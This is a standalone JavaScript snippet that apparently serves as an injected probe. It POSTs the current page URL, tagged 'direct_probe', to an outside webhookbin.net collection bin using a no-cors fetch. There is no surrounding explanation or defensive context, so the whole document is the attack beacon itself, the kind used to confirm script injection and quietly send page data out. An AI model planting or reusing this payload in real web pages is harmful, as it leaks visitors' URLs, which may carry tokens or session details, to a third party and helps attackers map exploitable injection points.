fetch('https://webhookbin.net/v1/bin/dceb4d02-aa29-45da-9a13-01038a1def67', {
  method: 'POST',
  mode: 'no-cors',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'stage=direct_probe&u=' + encodeURIComponent(location.href)
});
